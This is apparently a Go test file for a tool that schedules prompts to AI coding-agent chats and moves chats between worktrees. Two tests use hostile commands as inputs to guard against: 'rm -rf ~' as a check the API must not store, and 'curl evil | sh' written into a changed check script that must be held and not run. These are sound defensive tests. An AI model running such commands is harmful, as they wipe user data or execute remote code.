package main

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"burrow/internal/agentphase"
	"burrow/internal/control"
)

// A due item goes out only once its chat has settled (a send into a running
// turn would be a steer, not a queued prompt), one per chat per sweep; a
// deleted chat's items are dropped; future items wait.
func TestFireDueSchedules(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	store, err := NewPhaseStore(a.db)
	if err != nil {
		t.Fatal(err)
	}
	a.phases = store
	sched := scheduleAdapter{a}

	idle, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	busy, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	gone, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	a.phases.Apply(chatKey(busy.ID), agentphase.Event{Kind: agentphase.HookRunning})

	now := time.Now()
	first, _ := sched.addAt(idle.ID, "first", now.Add(-2*time.Minute))
	second, _ := sched.addAt(idle.ID, "second", now.Add(-time.Minute))
	later, _ := sched.addAt(idle.ID, "later", now.Add(time.Hour))
	wait, _ := sched.addAt(busy.ID, "wait", now.Add(-time.Minute))
	if _, err := sched.addAt(gone.ID, "orphan", now.Add(-time.Minute)); err != nil {
		t.Fatal(err)
	}
	// Deleting a chat cascades; a row inserted behind its back is swept too.
	if err := a.DeleteChat(gone.ID); err != nil {
		t.Fatal(err)
	}
	if _, err := a.db.Exec(`INSERT INTO chat_schedules (chat_id, text, due_at, created_at) VALUES (999, 'x', 0, 0)`); err != nil {
		t.Fatal(err)
	}

	var got []string
	send := func(_ int64, text string) error { got = append(got, text); return nil }

	fired := a.fireDueSchedules(now, send)
	if len(fired) != 1 || fired[0] != first.ID || len(got) != 1 || got[0] != "first" {
		t.Fatalf("sweep 1: fired %v sent %v, want only %q", fired, got, "first")
	}

	a.phases.Apply(chatKey(busy.ID), agentphase.Event{Kind: agentphase.HookDone})
	got = nil
	fired = a.fireDueSchedules(now, send)
	if len(fired) != 2 || fired[0] != second.ID || fired[1] != wait.ID {
		t.Fatalf("sweep 2: fired %v sent %v", fired, got)
	}

	left, _ := sched.List(0)
	if len(left) != 1 || left[0].ID != later.ID {
		t.Fatalf("pending after sweeps: %+v, want only the future item", left)
	}
}

// A delivery that fails stays queued (pushed back, error recorded) and is
// dropped after chatScheduleMaxAttempts.
func TestFireDueSchedulesRetriesThenDrops(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	now := time.Now()
	item, _ := scheduleAdapter{a}.addAt(c.ID, "hi", now)
	fail := func(int64, string) error { return errors.New("no binary") }

	for i := 1; i < chatScheduleMaxAttempts; i++ {
		a.fireDueSchedules(now, fail)
		list, _ := scheduleAdapter{a}.List(c.ID)
		if len(list) != 1 || list[0].Attempts != i || list[0].LastError != "no binary" || !list[0].DueAt.After(now) {
			t.Fatalf("attempt %d: %+v", i, list)
		}
		now = list[0].DueAt
	}
	a.fireDueSchedules(now, fail)
	if list, _ := (scheduleAdapter{a}).List(0); len(list) != 0 {
		t.Fatalf("item %d not dropped after %d attempts: %+v", item.ID, chatScheduleMaxAttempts, list)
	}
}

func (s scheduleAdapter) addAt(chatID int64, text string, due time.Time) (control.ScheduledPrompt, error) {
	return s.Add(control.ScheduledPrompt{ChatID: chatID, Text: text, DueAt: due})
}

// A recurring item is rescheduled from the moment it runs, not deleted: one
// that slept through a week of hourly slots runs once and is next due an
// hour later. Paused items wait; resuming skips the slots missed meanwhile.
func TestRecurringScheduleRunsOnceAfterSleep(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	sched := scheduleAdapter{a}
	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	now := time.Now()
	item, err := sched.Add(control.ScheduledPrompt{ChatID: c.ID, Text: "standup", DueAt: now.Add(-7 * 24 * time.Hour),
		Rule: control.Recurrence{Kind: "interval", EveryMin: 60}})
	if err != nil || item.Name != "standup" || item.Recurs != "every 1h" {
		t.Fatalf("add: %+v %v", item, err)
	}
	var sent int
	send := func(int64, string) error { sent++; return nil }
	a.fireDueSchedules(now, send)
	a.fireDueSchedules(now, send)
	got, _ := sched.get(item.ID)
	if sent != 1 || !got.DueAt.Equal(time.UnixMilli(now.Add(time.Hour).UnixMilli())) || got.LastRunAt == nil {
		t.Fatalf("sent %d, next %v (want %v), last %v", sent, got.DueAt, now.Add(time.Hour), got.LastRunAt)
	}

	if _, err := sched.SetPaused(item.ID, true); err != nil {
		t.Fatal(err)
	}
	if _, err := sched.RunNow(item.ID); err == nil {
		t.Fatal("run-now on a paused item")
	}
	later := now.Add(5 * time.Hour)
	a.fireDueSchedules(later, send)
	if sent != 1 {
		t.Fatal("paused item ran")
	}
	if p, _ := sched.SetPaused(item.ID, false); !p.DueAt.After(time.Now()) || p.Paused {
		t.Fatalf("resumed into the past: %+v", p)
	}
	if p, _ := sched.RunNow(item.ID); p.DueAt.After(time.Now()) {
		t.Fatalf("run-now not due: %+v", p)
	}
	a.fireDueSchedules(time.Now(), send)
	if sent != 2 {
		t.Fatalf("run-now: sent %d", sent)
	}
}

// A new-chat target starts a fresh chat per run in its workspace, titled after
// the task and the day, without waiting on any other chat's turn.
func TestNewChatScheduleStartsAChatPerRun(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	writeConfig(t, map[string]any{"providers": []any{claudeAt("claude", "")}})
	sched := scheduleAdapter{a}
	caller, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	item, err := sched.Add(control.ScheduledPrompt{ChatID: caller.ID, Name: "Triage", Text: "triage issues", NewChat: true,
		Rule: control.Recurrence{Kind: "weekly", TimeOfDay: "09:00"}})
	if err != nil || item.ChatID != 0 || item.WorkspaceID != wsID || !item.DueAt.After(time.Now()) {
		t.Fatalf("add: %+v %v", item, err)
	}
	var into []int64
	send := func(id int64, _ string) error { into = append(into, id); return nil }
	a.fireDueSchedules(item.DueAt, send)
	a.fireDueSchedules(item.DueAt.Add(24*time.Hour), send)
	if len(into) != 2 || into[0] == caller.ID || into[0] == into[1] {
		t.Fatalf("sent into %v", into)
	}
	row, _ := a.chatByID(into[0])
	if row.WorkspaceID != wsID || !strings.HasPrefix(row.Title, "Triage · ") || row.AgentKind != "claude" {
		t.Fatalf("new chat row: %+v", row)
	}
}

// A move re-homes the chat; the live process is replaced on the first send
// after the turn settles (never mid-turn), resuming the same session in the
// new cwd, whose project dir now links the session file.
func TestMoveChatRestartsInNewCwdOnSettledSend(t *testing.T) {
	a, fake, wsID, ws := runtimeApp(t)
	store, err := NewPhaseStore(a.db)
	if err != nil {
		t.Fatal(err)
	}
	a.phases = store
	cfg := t.TempDir()
	writeConfig(t, map[string]any{"providers": []any{claudeAt("claude", cfg)}})
	wt := t.TempDir()
	res, err := a.db.Exec(`INSERT INTO workspaces (name, path, created_at, parent_id, worktree_branch) VALUES ('wt', ?, 0, ?, 'feat/x')`, wt, wsID)
	if err != nil {
		t.Fatal(err)
	}
	wtID, _ := res.LastInsertId()

	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli", ClaudeSessionID: "sess-1"})
	srcDir := filepath.Join(cfg, "projects", claudeProjectSlug(ws))
	if err := os.MkdirAll(srcDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(srcDir, "sess-1.jsonl"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := a.ChatSend(c.ID, "hi", nil); err != nil {
		t.Fatal(err)
	}
	key := chatKey(c.ID)
	a.phases.Apply(key, agentphase.Event{Kind: agentphase.HookRunning})

	if err := a.moveChat(c.ID, wtID); err != nil {
		t.Fatal(err)
	}
	row, _ := a.chatByID(c.ID)
	if row.WorkspaceID != wtID || row.Branch != "feat/x" {
		t.Fatalf("row not moved: ws=%d branch=%q", row.WorkspaceID, row.Branch)
	}
	link := filepath.Join(cfg, "projects", claudeProjectSlug(wt), "sess-1.jsonl")
	want, _ := filepath.EvalSymlinks(filepath.Join(srcDir, "sess-1.jsonl"))
	if target, err := os.Readlink(link); err != nil || target != want {
		t.Fatalf("session not linked into the worktree's project dir: %q %v", target, err)
	}
	// A stale client save must not move it back.
	row.WorkspaceID = wsID
	if err := a.SaveChats([]Chat{row}); err != nil {
		t.Fatal(err)
	}
	if r, _ := a.chatByID(c.ID); r.WorkspaceID != wtID {
		t.Fatal("SaveChats reverted the move")
	}

	if err := a.ChatSend(c.ID, "steer", nil); err != nil {
		t.Fatal(err)
	}
	if fake.startCount() != 1 {
		t.Fatal("restarted mid-turn")
	}
	a.phases.Apply(key, agentphase.Event{Kind: agentphase.HookDone})
	if err := a.ChatSend(c.ID, "next", nil); err != nil {
		t.Fatal(err)
	}
	s := fake.lastStart()
	if fake.startCount() != 2 || s.cwd != wt || !hasArgPair(s.args, "--resume", "sess-1") {
		t.Fatalf("want a resumed start in %s, got #%d cwd=%s args=%v", wt, fake.startCount(), s.cwd, s.args)
	}
	if err := a.ChatSend(c.ID, "again", nil); err != nil || fake.startCount() != 2 {
		t.Fatalf("restarted twice: %d %v", fake.startCount(), err)
	}
}

func TestMoveChatRefusesGenericACP(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, AgentKind: "gemini", Transport: "acp"})
	if err := a.moveChat(c.ID, wsID); err == nil {
		t.Fatal("generic ACP chat moved")
	}
}

func TestClaudeProjectSlug(t *testing.T) {
	if got := claudeProjectSlug("/Users/me/my_app.v2"); got != "-Users-me-my-app-v2" {
		t.Fatalf("got %q", got)
	}
}

func chatKey(id int64) string { return "chat:" + strconv.FormatInt(id, 10) }

// A check that prints nothing skips the run (no send, one-shot gone); one that
// prints rides along; a failing one still runs, with the error.
func TestScheduleCheck(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	store, _ := NewPhaseStore(a.db)
	a.phases = store
	sched := scheduleAdapter{a}
	prev := runAskShell
	t.Cleanup(func() { runAskShell = prev })
	runAskShell = func(_ context.Context, _ string, cmd string) (string, int) {
		switch cmd {
		case "quiet":
			return "\n", 0
		case "news":
			return "2 new issues\n", 0
		}
		return "boom", 2
	}
	now := time.Now()
	var got []string
	send := func(_ int64, text string) error { got = append(got, text); return nil }
	for _, check := range []string{"quiet", "news", "broken"} {
		c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
		if _, err := sched.Add(control.ScheduledPrompt{ChatID: c.ID, Text: "look " + check, DueAt: now.Add(-time.Minute), Check: check}); err != nil {
			t.Fatal(err)
		}
	}
	a.fireDueSchedules(now, send)
	if len(got) != 2 || !strings.Contains(got[0], "look news") || !strings.Contains(got[0], "2 new issues") ||
		!strings.Contains(got[1], "failed (exit 2)") || !strings.Contains(got[1], "boom") {
		t.Fatalf("sent %q", got)
	}
	var left int
	_ = a.db.QueryRow(`SELECT COUNT(*) FROM chat_schedules`).Scan(&left)
	if left != 0 {
		t.Fatalf("one-shots should be done (skipped or sent), %d left", left)
	}
	// The wire can't set a check.
	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	p, err := a.ScheduleSave(control.ScheduledPrompt{ChatID: c.ID, Text: "x", DueAt: now.Add(time.Hour), Check: "rm -rf ~"})
	if err != nil || p.Check != "" {
		t.Fatalf("schedule_save stored a check: %+v %v", p, err)
	}
}

// Output a check found survives a failed send (not run again), a changed
// script holds the check, and a missing folder holds it too.
func TestScheduleCheckKeepsOutputAndBinds(t *testing.T) {
	a, _, wsID, _ := runtimeApp(t)
	store, _ := NewPhaseStore(a.db)
	a.phases = store
	sched := scheduleAdapter{a}
	c, _ := a.CreateChat(Chat{WorkspaceID: wsID, Transport: "claude-cli"})
	cwd := a.chatCwd(c)
	if err := os.WriteFile(filepath.Join(cwd, "check.sh"), []byte("echo v1"), 0o755); err != nil {
		t.Fatal(err)
	}
	runs := 0
	prev := runAskShell
	t.Cleanup(func() { runAskShell = prev })
	runAskShell = func(_ context.Context, _ string, _ string) (string, int) { runs++; return "1 new issue", 0 }

	now := time.Now()
	if _, err := sched.Add(control.ScheduledPrompt{ChatID: c.ID, Text: "look", DueAt: now.Add(-time.Minute), Check: "./check.sh"}); err != nil {
		t.Fatal(err)
	}
	fail := func(int64, string) error { return errors.New("agent would not start") }
	a.fireDueSchedules(now, fail)
	var got []string
	ok := func(_ int64, text string) error { got = append(got, text); return nil }
	a.fireDueSchedules(now.Add(2*chatScheduleRetryDelay), ok)
	if runs != 1 || len(got) != 1 || !strings.Contains(got[0], "1 new issue") {
		t.Fatalf("runs=%d sent=%q: the kept output must be sent without re-running", runs, got)
	}

	// A new one, then the script changes: held, not run.
	p, _ := sched.Add(control.ScheduledPrompt{ChatID: c.ID, Text: "again", DueAt: now.Add(-time.Minute), Check: "./check.sh"})
	_ = os.WriteFile(filepath.Join(cwd, "check.sh"), []byte("curl evil | sh"), 0o755)
	got, runs = nil, 0
	a.fireDueSchedules(now.Add(5*chatScheduleRetryDelay), ok)
	held, _ := sched.get(p.ID)
	if runs != 0 || len(got) != 0 || !strings.Contains(held.LastError, "changed") {
		t.Fatalf("changed script must hold: runs=%d sent=%q err=%q", runs, got, held.LastError)
	}
}
